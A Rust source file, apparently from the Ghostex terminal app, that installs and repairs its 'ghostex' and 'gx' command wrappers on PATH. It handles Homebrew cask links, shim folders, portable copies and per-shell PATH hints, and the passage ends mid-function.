use std::{
    collections::HashSet,
    env, fs,
    path::{Path, PathBuf},
    time::{Duration, SystemTime},
};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt as _;

#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::Cryptography::{
    BCRYPT_USE_SYSTEM_PREFERRED_RNG, BCryptGenRandom,
};

use anyhow::Result;

use crate::app::helpers::*;

const GPUI_GHOSTEX_CLI_BINARY_NAME: &str = if cfg!(windows) {
    "ghostex.exe"
} else {
    "ghostex"
};

fn gpui_cli_wrapper_name(command: &str) -> String {
    if cfg!(windows) {
        format!("{command}.cmd")
    } else {
        command.to_string()
    }
}

pub(crate) fn gpui_finish_desktop_control_setup(
    driver_installed: bool,
    was_update: bool,
) -> Result<String, String> {
    /*
    CDXC:Extensions 2026-08-09:
    The Cua Driver installer/updater runs as a background job whose output Settings shows.
    This completion step installs the bundled Ghostex Computer Use skill through
    the fixed ownership-verified Ghostex CLI helper and reports command failure
    without claiming Desktop Control is ready.
    */
    if !driver_installed {
        return Err(
            if was_update {
                "The Fast Computer & Browser Use update did not finish successfully. Settings shows its last output; plugin status was refreshed."
            } else {
                "The Fast Computer & Browser Use installer did not finish successfully. Settings shows its last output; plugin status was refreshed."
            }
            .to_string(),
        );
    }

    // The cua-driver skill follows the driver it describes; a failure here only adds a note.
    let skill_note = match gpui_install_cua_driver_skill() {
        Ok(_) => "",
        Err(_) => " The Cua Driver skill could not be installed; install it from Settings.",
    };
    match gpui_install_bundled_ghostex_skill(
        &["computer-use", "install-skill"],
        "Ghostex Computer Use",
    ) {
        Ok(_) => Ok(if was_update {
            format!(
                "Fast Computer & Browser Use is up to date. Ghostex Computer Use is ready.{skill_note}"
            )
        } else {
            // Accessibility and Screen Recording are macOS grants; Windows and X11 ask nothing.
            if cfg!(target_os = "macos") {
                format!(
                    "Fast Computer & Browser Use installed. Grant accessibility and screen recording permissions if needed.{skill_note}"
                )
            } else {
                format!("Fast Computer & Browser Use installed.{skill_note}")
            }
        }),
        Err(message) => Err(format!(
            "Fast Computer & Browser Use {}, but Ghostex Computer Use skill could not be installed. {message}",
            if was_update { "updated" } else { "installed" }
        )),
    }
}

pub(crate) fn gpui_repair_ghostex_cli_commands() -> Result<String, String> {
    if gpui_uses_isolated_storage() {
        return Err("This isolated app does not replace the shared ghostex or gx commands. Use cargo xtask gx-isolated from its checkout.".to_string());
    }
    if ghostex_paths::portable::current().is_some() {
        return Err("This portable copy does not replace the shared ghostex or gx commands. Terminals it opens run its own ghostex.".to_string());
    }
    /*
    CDXC:Cli 2026-06-24-12:56:
    CLI repair is real only when GPUI is running from a packaged app that ships the native CLI binary. Development binaries must report unavailable status instead of synthesizing wrappers to a source checkout, while packaged repair writes public wrappers outside the app and replaces only marked Ghostex wrappers, app-owned CLI symlinks, or broken symlinks.
    */
    let cli_dir = gpui_bundled_ghostex_cli_resource_dir()?;
    let cli_binary_path = cli_dir.join(GPUI_GHOSTEX_CLI_BINARY_NAME);
    let path_entries = gpui_cli_path_entries();
    let common_dirs = gpui_common_cli_install_dirs();
    let install_dirs = gpui_cli_install_dirs(&path_entries, &common_dirs, &cli_dir);

    let ghostex_result =
        gpui_install_ghostex_cli_command("ghostex", &cli_binary_path, &cli_dir, &install_dirs);
    if !ghostex_result.installed() {
        return match ghostex_result {
            GpuiCliCommandInstallResult::Blocked { existing_path } => Err(format!(
                "A ghostex command that does not belong to Ghostex already exists at {}. Remove or rename it, then link the CLI again. No unrelated command was overwritten.",
                gpui_path_string(&existing_path)
            )),
            _ => Err(format!(
                "Ghostex could not write the ghostex command into any install location ({}). Check that one of them is writable, then link the CLI again.",
                gpui_describe_cli_install_dirs(&install_dirs)
            )),
        };
    }

    let gx_result =
        gpui_install_ghostex_cli_command("gx", &cli_binary_path, &cli_dir, &install_dirs);
    let path_hint = gpui_cli_user_bin_path_hint(
        &gpui_home_dir().join(".local/bin"),
        &path_entries,
        &gpui_home_dir(),
    )
    .map(|hint| format!(" {hint}"))
    .unwrap_or_default();
    match gx_result {
        GpuiCliCommandInstallResult::Blocked { existing_path } => Ok(format!(
            "Ghostex CLI linked. The gx alias was not changed because another command already owns that name at {}.{path_hint}",
            gpui_path_string(&existing_path)
        )),
        GpuiCliCommandInstallResult::Unavailable => Ok(format!(
            "Ghostex CLI linked. The gx alias could not be linked because no writable install location was available.{path_hint}"
        )),
        GpuiCliCommandInstallResult::Current | GpuiCliCommandInstallResult::Repaired => {
            Ok(format!(
                "Ghostex CLI linked. ghostex and gx now launch this GPUI app build where available.{path_hint}"
            ))
        }
    }
}

/// CDXC:Cli 2026-10-28 WHY:
/// On Linux (and a Mac without Homebrew's folders) the only writable place for the `ghostex` and
/// `gx` launchers is ~/.local/bin, which minimal installs leave off PATH, so the link "worked" while
/// a terminal outside Ghostex still answered "command not found". When the launchers are there and
/// the folder is not on PATH, the link's result says so and gives the line to add. Windows keeps
/// its own PATH handling.
pub(crate) fn gpui_cli_user_bin_path_hint(
    user_bin: &Path,
    path_entries: &[PathBuf],
    home: &Path,
) -> Option<String> {
    if cfg!(windows) || path_entries.iter().any(|entry| entry == user_bin) {
        return None;
    }
    let launcher = user_bin.join(gpui_cli_wrapper_name("ghostex"));
    if !gpui_path_exists_or_is_symlink(&launcher) {
        return None;
    }
    let shown = user_bin
        .strip_prefix(home)
        .map(|rest| format!("~/{}", rest.to_string_lossy()))
        .unwrap_or_else(|_| gpui_path_string(user_bin));
    Some(format!(
        "{shown} is not on your PATH, so terminals outside Ghostex will not find ghostex or gx. {}",
        gpui_cli_path_fix(std::env::var("SHELL").ok().as_deref()).instruction()
    ))
}

/// The line that puts ~/.local/bin on PATH for the user's shell, and where it goes.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct GpuiCliPathFix {
    pub(crate) command: String,
    /// Where it goes, in words: a shell file, or "run it once" for fish.
    pub(crate) place: String,
}

impl GpuiCliPathFix {
    pub(crate) fn instruction(&self) -> String {
        format!("{}, then open a new terminal: {}", self.place, self.command)
    }
}

/// `shell` is `$SHELL`; its file name picks the profile the user's terminals read.
pub(crate) fn gpui_cli_path_fix(shell: Option<&str>) -> GpuiCliPathFix {
    let name = shell
        .map(|shell| shell.rsplit('/').next().unwrap_or(shell).trim())
        .unwrap_or_default();
    let export = "export PATH=\"$HOME/.local/bin:$PATH\"".to_string();
    let (command, place) = match name {
        "fish" => (
            "fish_add_path $HOME/.local/bin".to_string(),
            "Run this once in fish (it keeps the folder for new terminals)",
        ),
        "zsh" => (export, "Add this line to ~/.zshrc"),
        "bash" => (export, "Add this line to ~/.bashrc"),
        _ => (export, "Add this line to ~/.profile"),
    };
    GpuiCliPathFix {
        command,
        place: place.to_string(),
    }
}

fn gpui_describe_cli_install_dirs(install_dirs: &[PathBuf]) -> String {
    let mut described = install_dirs
        .iter()
        .take(4)
        .map(|directory| gpui_path_string(directory))
        .collect::<Vec<_>>();
    if install_dirs.len() > described.len() {
        described.push("…".to_string());
    }
    described.join(", ")
}

/// CDXC:Cli 2026-09-24 DECISION:
/// User: "pls fix root cause here. if we need ghostex cli then lets auto install it". Chat sends and agents need the `ghostex` command, so packaged startup installs the public `ghostex` and `gx` wrappers when either name is missing, and refreshes Ghostex-owned wrappers that point at another or older bundle (Sparkle and DMG updates swap the bundle but never rewrite them). This supersedes the 2026-08-30 rule that startup only refreshed existing wrappers and never did a first install. It runs the same repair as Settings > Integrations, so a command of the same name that Ghostex did not write is never overwritten, and when every wrapper already matches nothing is written.
/// CDXC:Cli 2026-10-17 DECISION:
/// User, on whether a Windows portable copy installs the public wrappers: "never for portable". A portable copy (ghostex_paths::portable) never installs or refreshes the public `ghostex` and `gx` wrappers, even when none exist; the terminals it opens use its own CLI through PATH (`portable_cli_first_on_path` in server/src/zmx/scripts_windows.rs).
/// SEE-ALSO: `session_ghostex_cli_executable` in server/src/zmx/scripts.rs, which pins each session's prompt editor to the bundled CLI without needing PATH.
pub(crate) fn gpui_auto_install_ghostex_cli_wrappers() {
    // A portable copy leaves the public wrappers to the installed Ghostex; its sessions find its own CLI first on PATH (scripts_windows.rs).
    if gpui_uses_isolated_storage() || ghostex_paths::portable::current().is_some() {
        return;
    }
    let Ok(cli_dir) = gpui_bundled_ghostex_cli_resource_dir() else {
        return;
    };
    let cli_binary_path = cli_dir.join(GPUI_GHOSTEX_CLI_BINARY_NAME);
    let wrapper = gpui_ghostex_cli_wrapper_content(&cli_binary_path);
    let path_entries = gpui_cli_path_entries();
    let common_dirs = gpui_common_cli_install_dirs();

    let mut needs_install = false;
    'commands: for command in ["ghostex", "gx"] {
        let mut command_exists = false;
        for candidate in gpui_cli_command_path_candidates(command, &path_entries, &common_dirs) {
            if !gpui_path_exists_or_is_symlink(&candidate) {
                continue;
            }
            // A wrapper an earlier Ghostex left in a shim or tool folder does not count: that
            // tool rewrites the folder, so the repair below writes a lasting one elsewhere.
            if candidate
                .parent()
                .is_some_and(|dir| gpui_is_tool_managed_bin_dir(dir, &gpui_home_dir()))
            {
                continue;
            }
            command_exists = true;
            match gpui_package_managed_cli(command, &candidate, &cli_binary_path) {
                GpuiPackageManagedCli::Keep => continue,
                GpuiPackageManagedCli::Relink { .. } => {
                    needs_install = true;
                    break 'commands;
                }
                GpuiPackageManagedCli::NotManaged => {}
            }
            if gpui_is_broken_symlink(&candidate) {
                needs_install = true;
                break 'commands;
            }
            if !gpui_is_ghostex_owned_command_path(command, &candidate, &cli_dir) {
                continue;
            }
            let is_current = gpui_is_regular_file(&candidate)
                && fs::read_to_string(&candidate)
                    .map(|content| content == wrapper)
                    .unwrap_or(false);
            if !is_current {
                needs_install = true;
                break 'commands;
            }
        }
        if !command_exists {
            needs_install = true;
            break;
        }
    }
    if !needs_install {
        return;
    }
    if let Err(message) = gpui_repair_ghostex_cli_commands() {
        eprintln!("ghostex-gpui could not install or refresh the Ghostex CLI wrappers: {message}");
    }
}

/// CDXC:Build 2026-09-13 WHY:
/// A separately installed app would otherwise repair the user's public CLI wrappers to its own bundle on startup.
pub(crate) fn gpui_uses_isolated_storage() -> bool {
    env::var_os("GHOSTEX_HOME")
        .is_some_and(|value| !value.is_empty() && Path::new(&value).is_absolute())
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub(crate) enum GpuiCliCommandInstallResult {
    Current,
    Repaired,
    /// An executable command with that name exists on PATH and is not one
    /// Ghostex wrote, so writing a wrapper anywhere would either overwrite the
    /// user's command or be shadowed by it.
    Blocked {
        existing_path: PathBuf,
    },
    Unavailable,
}

impl GpuiCliCommandInstallResult {
    pub(crate) fn installed(&self) -> bool {
        matches!(self, Self::Current | Self::Repaired)
    }
}

pub(crate) fn gpui_bundled_ghostex_cli_resource_dir() -> Result<PathBuf, String> {
    let executable = env::current_exe().map_err(|_| {
        "Packaged Ghostex CLI resources are unavailable in this GPUI build. Current integration status was refreshed without changing files."
            .to_string()
    })?;
    #[cfg(target_os = "macos")]
    let cli_dir = find_app_bundle_root(&executable)
        .map(|bundle_root| bundle_root.join("Contents/Resources/CLI"));
    #[cfg(target_os = "linux")]
    let cli_dir = executable
        .parent()
        .map(|executable_dir| executable_dir.join("gxserver/bin"));
    #[cfg(target_os = "windows")]
    let cli_dir = executable
        .parent()
        .map(|executable_dir| executable_dir.join("resources/native"));
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    let cli_dir: Option<PathBuf> = None;
    let Some(cli_dir) = cli_dir else {
        return Err(
            "Packaged Ghostex CLI resources are unavailable in this GPUI build. Current integration status was refreshed without changing files."
                .to_string(),
        );
    };
    if gpui_is_file(&cli_dir.join(GPUI_GHOSTEX_CLI_BINARY_NAME)) {
        Ok(cli_dir)
    } else {
        Err(
            "Packaged Ghostex CLI resources are unavailable in this GPUI build. Current integration status was refreshed without changing files."
                .to_string(),
        )
    }
}

pub(crate) fn gpui_install_ghostex_cli_command(
    command: &str,
    cli_binary_path: &Path,
    cli_dir: &Path,
    install_dirs: &[PathBuf],
) -> GpuiCliCommandInstallResult {
    /*
    CDXC:Cli 2026-09-02:
    First-launch setup links the CLI while the startup wrapper refresh may still
    be running for a user who upgraded, so the wrapper is staged and renamed
    into place instead of remove-then-write: two writers can never race each
    other into a missing command or an "Unavailable" result. A directory whose
    write fails is skipped for the next candidate instead of aborting the whole
    install, and a foreign executable is reported with its path (from any PATH
    directory, writable or not) because a wrapper written elsewhere would just
    be shadowed by it and status would still say the CLI is unusable.
    */
    let wrapper = gpui_ghostex_cli_wrapper_content(cli_binary_path);
    #[cfg(windows)]
    if let Some(existing_path) = gpui_which_command(command) {
        if !gpui_can_replace_existing_ghostex_command(command, &existing_path, cli_dir) {
            return GpuiCliCommandInstallResult::Blocked { existing_path };
        }
    }
    // Put back the package-manager links an earlier Ghostex replaced with
    // wrapper files first, wherever they sit in the search order: the loop
    // below stops at the first usable directory (GitHub issue #203).
    for directory in install_dirs {
        let link_path = directory.join(gpui_cli_wrapper_name(command));
        if !gpui_path_exists_or_is_symlink(&link_path) {
            continue;
        }
        if let GpuiPackageManagedCli::Relink { target } =
            gpui_package_managed_cli(command, &link_path, cli_binary_path)
        {
            let _ = gpui_replace_with_symlink(&link_path, &target);
        }
    }
    for directory in install_dirs {
        let link_path = directory.join(gpui_cli_wrapper_name(command));
        match gpui_package_managed_cli(command, &link_path, cli_binary_path) {
            GpuiPackageManagedCli::Keep => return GpuiCliCommandInstallResult::Current,
            GpuiPackageManagedCli::Relink { target } => {
                if gpui_replace_with_symlink(&link_path, &target).is_ok() {
                    return GpuiCliCommandInstallResult::Repaired;
                }
                continue;
            }
            GpuiPackageManagedCli::NotManaged => {}
        }
        let exists = gpui_path_exists_or_is_symlink(&link_path);
        if exists && !gpui_can_replace_existing_ghostex_command(command, &link_path, cli_dir) {
            if gpui_is_executable_file(&link_path) {
                return GpuiCliCommandInstallResult::Blocked {
                    existing_path: link_path,
                };
            }
            // Non-executable foreign junk cannot shadow a wrapper; leave it
            // alone and keep looking for a directory Ghostex can use.
            continue;
        }
        if !gpui_prepare_cli_install_directory(directory) {
            continue;
        }
        if exists
            && gpui_is_regular_file(&link_path)
            && fs::read_to_string(&link_path)
                .map(|content| content == wrapper)
                .unwrap_or(false)
        {
            let _ = gpui_set_executable_permissions(&link_path);
            gpui_clear_macos_execution_policy_xattrs(&link_path);
            return GpuiCliCommandInstallResult::Current;
        }
        if gpui_write_executable_wrapper(&link_path, &wrapper).is_ok() {
            gpui_clear_macos_execution_policy_xattrs(&link_path);
            return GpuiCliCommandInstallResult::Repaired;
        }
    }
    GpuiCliCommandInstallResult::Unavailable
}

#[cfg(windows)]
pub(crate) fn gpui_ghostex_cli_wrapper_content(cli_binary_path: &Path) -> String {
    format!(
        "@echo off\r\nsetlocal DisableDelayedExpansion\r\nrem {GPUI_GHOSTEX_CLI_WRAPPER_MARKER}\r\n\"{}\" %*\r\nexit /b %errorlevel%\r\n",
        gpui_path_string(cli_binary_path).replace('%', "%%")
    )
}

#[cfg(not(windows))]
pub(crate) fn gpui_ghostex_cli_wrapper_content(cli_binary_path: &Path) -> String {
    /*
    CDXC:Cli 2026-07-13:
    The bundled CLI is the native Rust `ghostex` binary (Contents/Resources/
    CLI/ghostex); wrappers exec it directly with no Node runtime. The wrapper
    file (rather than a symlink) is kept so macOS policy assessment does not
    execute app-bundled content directly and ownership stays marker-provable.
    */
    [
        "#!/bin/bash".to_string(),
        "set -euo pipefail".to_string(),
        format!("# {GPUI_GHOSTEX_CLI_WRAPPER_MARKER}: Public PATH commands live outside the app bundle so macOS does not directly execute app-bundled shell scripts during policy assessment."),
        format!(
            "exec {} \"$@\"",
            gpui_shell_single_quote_path(cli_binary_path)
        ),
        String::new(),
    ]
    .join("\n")
}

pub(crate) fn gpui_shell_single_quote_path(path: &Path) -> String {
    format!("'{}'", gpui_path_string(path).replace('\'', "'\\''"))
}

pub(crate) fn gpui_cli_path_entries() -> Vec<PathBuf> {
    gpui_unique_paths(
        env::var_os("PATH")
            .into_iter()
            .flat_map(|paths| env::split_paths(&paths).collect::<Vec<_>>())
            .filter(|path| !path.as_os_str().is_empty()),
    )
}

pub(crate) fn gpui_common_cli_install_dirs() -> Vec<PathBuf> {
    #[cfg(windows)]
    let directories = vec![gpui_home_dir().join(".local/bin")];
    #[cfg(not(windows))]
    let directories = vec![
        PathBuf::from("/opt/homebrew/bin"),
        PathBuf::from("/usr/local/bin"),
        gpui_home_dir().join(".local/bin"),
    ];
    gpui_unique_paths(directories)
}

pub(crate) fn gpui_cli_install_dirs(
    path_entries: &[PathBuf],
    common_dirs: &[PathBuf],
    cli_dir: &Path,
) -> Vec<PathBuf> {
    gpui_cli_install_dirs_for(
        path_entries,
        common_dirs,
        cli_dir,
        &gpui_home_dir(),
        cfg!(target_os = "linux"),
    )
}

/// Folders another tool owns and rewrites: version-manager shims (mise, asdf, pyenv, rbenv,
/// nodenv, …), Nix profiles, Linux Homebrew, Snap, and the bin folders of `~/.cargo`, `~/.bun`,
/// Volta, fnm, nvm and Deno, plus Ghostex's own per-session folder.
///
/// CDXC:Cli 2026-10-28 WHY:
/// The launchers went into the first writable folder on PATH, which on a Linux desktop with mise
/// was `~/.local/share/mise/shims`. mise rewrites that folder on its next reshim, so `ghostex` and
/// `gx` vanished while the startup refresh kept writing them back. The launchers never go into
/// such a folder, and one left there by an earlier Ghostex no longer counts as installed.
pub(crate) fn gpui_is_tool_managed_bin_dir(dir: &Path, home: &Path) -> bool {
    if dir
        .components()
        .any(|component| component.as_os_str() == "shims")
    {
        return true;
    }
    const HOME_TOOL_ROOTS: [&str; 20] = [
        ".local/share/mise",
        ".local/state/mise",
        ".asdf",
        ".pyenv",
        ".rbenv",
        ".nodenv",
        ".goenv",
        ".jenv",
        ".cargo",
        ".rustup",
        ".bun",
        ".volta",
        ".nvm",
        ".fnm",
        ".local/share/fnm",
        ".deno",
        ".nix-profile",
        ".local/state/nix",
        ".linuxbrew",
        ".local/state/ghostex/session-bin",
    ];
    if HOME_TOOL_ROOTS
        .iter()
        .any(|root| dir.starts_with(home.join(root)))
    {
        return true;
    }
    const SYSTEM_TOOL_ROOTS: [&str; 5] = [
        "/nix",
        "/run/current-system",
        "/etc/profiles/per-user",
        "/home/linuxbrew",
        "/snap",
    ];
    SYSTEM_TOOL_ROOTS.iter().any(|root| dir.starts_with(root))
}

/// Where `ghostex` and `gx` may be written, best first: folders that already hold Ghostex's own
/// command (a package's `/usr/bin` script, an earlier wrapper), then on Linux `~/.local/bin`
/// (created when missing), then the rest of PATH and the common folders, never a tool-managed one.
pub(crate) fn gpui_cli_install_dirs_for(
    path_entries: &[PathBuf],
    common_dirs: &[PathBuf],
    cli_dir: &Path,
    home: &Path,
    prefer_user_bin: bool,
) -> Vec<PathBuf> {
    let mut owned_dirs = Vec::new();
    for command in ["ghostex", "gx"] {
        for candidate in gpui_cli_command_path_candidates(command, path_entries, common_dirs) {
            if gpui_path_exists_or_is_symlink(&candidate)
                && gpui_is_ghostex_owned_command_path(command, &candidate, cli_dir)
                && let Some(parent) = candidate.parent()
            {
                owned_dirs.push(parent.to_path_buf());
            }
        }
    }
    #[cfg(windows)]
    owned_dirs.extend(
        common_dirs
            .iter()
            .filter(|directory| path_entries.contains(directory))
            .cloned(),
    );
    let user_bin = prefer_user_bin.then(|| home.join(".local/bin"));
    gpui_unique_paths(
        owned_dirs
            .into_iter()
            .chain(user_bin)
            .chain(path_entries.iter().cloned())
            .chain(common_dirs.iter().cloned()),
    )
    .into_iter()
    .filter(|directory| !gpui_is_tool_managed_bin_dir(directory, home))
    .collect()
}

pub(crate) fn gpui_cli_command_path_candidates(
    command: &str,
    path_entries: &[PathBuf],
    common_dirs: &[PathBuf],
) -> Vec<PathBuf> {
    let found = gpui_which_command(command).into_iter();
    let wrapper_name = gpui_cli_wrapper_name(command);
    gpui_unique_paths(
        found
            .chain(
                path_entries
                    .iter()
                    .map(|directory| directory.join(&wrapper_name)),
            )
            .chain(
                common_dirs
                    .iter()
                    .map(|directory| directory.join(&wrapper_name)),
            ),
    )
}

pub(crate) fn gpui_unique_paths(paths: impl IntoIterator<Item = PathBuf>) -> Vec<PathBuf> {
    let mut result = Vec::new();
    let mut seen = HashSet::new();
    for path in paths {
        if path.as_os_str().is_empty() {
            continue;
        }
        if seen.insert(path.clone()) {
            result.push(path);
        }
    }
    result
}

pub(crate) fn gpui_prepare_cli_install_directory(directory: &Path) -> bool {
    let user_bin = gpui_home_dir().join(".local/bin");
    if directory == user_bin.as_path() && fs::create_dir_all(directory).is_err() {
        return false;
    }
    if !gpui_is_dir(directory) {
        return false;
    }
    gpui_directory_accepts_temporary_write(directory)
}

pub(crate) fn gpui_directory_accepts_temporary_write(directory: &Path) -> bool {
    let probe_path = directory.join(format!(
        ".ghostex-gpui-cli-write-test-{}-{}",
        std::process::id(),
        system_time_epoch_millis_string(SystemTime::now())
    ));
    match std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&probe_path)
    {
        Ok(_) => {
            let _ = fs::remove_file(&probe_path);
            true
        }
        Err(_) => false,
    }
}

pub(crate) fn gpui_can_replace_existing_ghostex_command(
    command: &str,
    path: &Path,
    cli_dir: &Path,
) -> bool {
    gpui_is_ghostex_owned_command_path(command, path, cli_dir) || gpui_is_broken_symlink(path)
}

pub(crate) fn gpui_is_ghostex_owned_command_path(
    command: &str,
    path: &Path,
    cli_dir: &Path,
) -> bool {
    if gpui_file_contains_ghostex_cli_wrapper_marker(path)
        || matches!(
            gpui_cli_entry_state(path),
            GpuiCliEntryState::Symlink { resolved: Some(ref resolved) }
                if gpui_is_package_cli_link_target(command, resolved)
        )
    {
        return true;
    }
    let realpath = gpui_realpath_or_self(path);
    if gpui_realpath_is_bundle_cli(&realpath, cli_dir)
        || gpui_is_linux_package_cli_wrapper_file(&realpath)
    {
        return true;
    }
    gpui_is_ghostex_app_owned_command_realpath(command, &realpath)
}

/// Whether `realpath` is this bundle's CLI: a file in its CLI folder, or the
/// file `CLI/ghostex` links to.
pub(crate) fn gpui_realpath_is_bundle_cli(realpath: &Path, cli_dir: &Path) -> bool {
    gpui_path_is_relative_to(realpath, cli_dir)
        || realpath == gpui_realpath_or_self(&cli_dir.join(GPUI_GHOSTEX_CLI_BINARY_NAME))
}

/// What a PATH entry for `ghostex` or `gx` is, as far as the package-manager rule cares.
#[derive(Clone, Debug, Eq, PartialEq)]
pub(crate) enum GpuiCliEntryState {
    Missing,
    /// `resolved` is the file the link finally points at, `None` when it dangles.
    Symlink {
        resolved: Option<PathBuf>,
    },
    /// A wrapper file Ghostex wrote (it carries the CliInstall marker).
    MarkedWrapper,
    /// The `/usr/bin/ghostex` script a Linux package installed.
    LinuxPackageWrapper,
    OtherFile,
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub(crate) enum GpuiPackageManagedCli {
    /// No package manager owns this entry; the ordinary wrapper rules apply.
    NotManaged,
    /// A package manager owns this entry and it works: leave it, the CLI is installed.
    Keep,
    /// A package manager owns this name: make the entry the symlink it expects.
    Relink { target: PathBuf },
}

/// CDXC:Cli 2026-10-06 WHY:
/// Never replace a PATH entry a package manager owns. The official Homebrew cask (`brew install --cask ghostex`) links HOMEBREW_PREFIX/bin/ghostex to Ghostex.app/Contents/Resources/CLI/ghostex with a `binary` stanza, and the tap cask links bin/ghostex and bin/gx to its own wrappers in Caskroom/ghostex/<version>/.homebrew-command-wrappers/. Startup used to swap the first for a wrapper file, and Homebrew refuses to replace a file that is not a symlink, so every later `brew upgrade` failed and its rollback deleted Ghostex.app (GitHub issue #203). So a symlink that resolves to a Ghostex.app CLI or into the ghostex Caskroom counts as installed and is never rewritten, and in a Homebrew bin folder whose prefix has the ghostex cask installed, a name the cask owns is only ever written as the symlink the cask expects: a wrapper Ghostex wrote there earlier, a dangling link, or a missing entry becomes that symlink, so the next `brew upgrade` works. `gx` is a cask name only when the tap's Caskroom holds a gx wrapper; the official cask links just `ghostex`, so its `gx` stays a wrapper file Homebrew never touches. Every other install still gets the marked wrapper file (CDXC:Cli 2026-07-13), and the cask's direct link is safe because the bundled CLI is a native binary, not a shell script.
/// SEE-ALSO: the Caskroom pattern in `gpui_is_probably_ghostex_command` (agents_hub/agent_hook_status.rs) and the deprecated tap cask's conflict check (maddada/homebrew-tap, Casks/ghostex.rb); the official cask has no preflight conflict check.
pub(crate) fn gpui_package_managed_cli_decision(
    command: &str,
    state: &GpuiCliEntryState,
    cask_link_target: Option<&Path>,
) -> GpuiPackageManagedCli {
    match state {
        GpuiCliEntryState::LinuxPackageWrapper => return GpuiPackageManagedCli::Keep,
        GpuiCliEntryState::Symlink {
            resolved: Some(resolved),
        } if gpui_is_package_cli_link_target(command, resolved) => {
            return GpuiPackageManagedCli::Keep;
        }
        _ => {}
    }
    let Some(target) = cask_link_target else {
        return GpuiPackageManagedCli::NotManaged;
    };
    match state {
        GpuiCliEntryState::Symlink { resolved: Some(_) }
        | GpuiCliEntryState::LinuxPackageWrapper => GpuiPackageManagedCli::Keep,
        GpuiCliEntryState::Missing
        | GpuiCliEntryState::Symlink { resolved: None }
        | GpuiCliEntryState::MarkedWrapper => GpuiPackageManagedCli::Relink {
            target: target.to_path_buf(),
        },
        // Someone else's file: the ordinary rules report it as blocking.
        GpuiCliEntryState::OtherFile => GpuiPackageManagedCli::NotManaged,
    }
}

/// A link target only a package manager installing Ghostex creates: the CLI
/// inside any Ghostex.app (`CLI/gx` is itself a link to `CLI/ghostex`), a
/// Homebrew cask wrapper for this command, or the Linux package's
/// `/usr/bin/ghostex` script (its `/usr/bin/gx` links there).
pub(crate) fn gpui_is_package_cli_link_target(command: &str, resolved: &Path) -> bool {
    let normalized = gpui_path_string(resolved).replace('\\', "/").to_lowercase();
    normalized.ends_with("/ghostex.app/contents/resources/cli/ghostex")
        || gpui_is_merged_bundle_cli_realpath(&normalized)
        || (normalized.contains("/caskroom/ghostex/")
            && normalized.ends_with(&format!("/.homebrew-command-wrappers/{command}")))
        || gpui_is_linux_package_cli_wrapper_file(resolved)
}

pub(crate) fn gpui_package_managed_cli(
    command: &str,
    link_path: &Path,
    cli_binary_path: &Path,
) -> GpuiPackageManagedCli {
    let state = gpui_cli_entry_state(link_path);
    let cask_link_target = gpui_homebrew_cask_link_target(command, link_path, cli_binary_path);
    gpui_package_managed_cli_decision(command, &state, cask_link_target.as_deref())
}

pub(crate) fn gpui_cli_entry_state(path: &Path) -> GpuiCliEntryState {
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return GpuiCliEntryState::Missing;
    };
    if metadata.file_type().is_symlink() {
        return GpuiCliEntryState::Symlink {
            resolved: fs::canonicalize(path).ok(),
        };
    }
    if gpui_is_marked_ghostex_wrapper_file(path) {
        GpuiCliEntryState::MarkedWrapper
    } else if gpui_is_linux_package_cli_wrapper_file(path) {
        GpuiCliEntryState::LinuxPackageWrapper
    } else {
        GpuiCliEntryState::OtherFile
    }
}

/// The symlink the installed ghostex cask expects at `link_path`, when
/// `link_path` is `<prefix>/bin/<command>` of a Homebrew prefix that has the
/// cask installed and the cask owns `command`.
fn gpui_homebrew_cask_link_target(
    command: &str,
    link_path: &Path,
    cli_binary_path: &Path,
) -> Option<PathBuf> {
    if !cfg!(target_os = "macos") {
        return None;
    }
    let bin_dir = link_path.parent()?;
    let caskroom = ["/opt/homebrew", "/usr/local"]
        .into_iter()
        .map(Path::new)
        .find(|prefix| bin_dir == prefix.join("bin"))?
        .join("Caskroom/ghostex");
    // An installed cask has a version folder; a failed upgrade rollback leaves
    // only `.metadata`, and then a fresh `brew install` must find bin empty.
    let version_dirs = fs::read_dir(&caskroom)
        .into_iter()
        .flatten()
        .flatten()
        .filter(|entry| !entry.file_name().to_string_lossy().starts_with('.'))
        .map(|entry| entry.path())
        .filter(|path| gpui_is_dir(path))
        .collect::<Vec<_>>();
    if version_dirs.is_empty() {
        return None;
    }
    // The tap cask's `command_wrapper` stanzas: newest installed version wins.
    let tap_wrapper = version_dirs
        .iter()
        .map(|version_dir| version_dir.join(".homebrew-command-wrappers").join(command))
        .filter(|wrapper| gpui_is_file(wrapper))
        .max_by_key(|wrapper| {
            fs::metadata(wrapper)
                .and_then(|metadata| metadata.modified())
                .unwrap_or(SystemTime::UNIX_EPOCH)
        });
    if tap_wrapper.is_some() {
        return tap_wrapper;
    }
    // The official cask: `binary "#{appdir}/Ghostex.app/Contents/Resources/CLI/ghostex"`.
    if command != "ghostex" {
        return None;
    }
    let cask_app_cli = Path::new("/Applications/Ghostex.app/Contents/Resources/CLI/ghostex");
    Some(if gpui_is_file(cask_app_cli) {
        cask_app_cli.to_path_buf()
    } else {
        cli_binary_path.to_path_buf()
    })
}

/// Swaps `path` for a symlink to `target` in one rename, the way
/// `gpui_write_executable_wrapper` swaps wrapper files.
fn gpui_replace_with_symlink(path: &Path, target: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        let parent = path.parent().ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "link path has no parent directory",
            )
        })?;
        let file_name = path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("ghostex");
        let staging_path = parent.join(format!(
            ".{file_name}.ghostex-gpui-link-{}-{}",
            std::process::id(),
            system_time_epoch_millis_string(SystemTime::now())
        ));
        let result = std::os::unix::fs::symlink(target, &staging_path)
            .and_then(|_| fs::rename(&staging_path, path));
        if result.is_err() {
            let _ = fs::remove_file(&staging_path);
        }
        result
    }
    #[cfg(not(unix))]
    {
        let _ = (path, target);
        Err(std::io::Error::new(
            std::io::ErrorKind::Unsupported,
            "package-manager CLI links exist only on macOS",
        ))
    }
}

pub(crate) fn gpui_is_ghostex_app_owned_command_realpath(command: &str, realpath: &Path) -> bool {
    let normalized = gpui_path_string(realpath).to_lowercase();
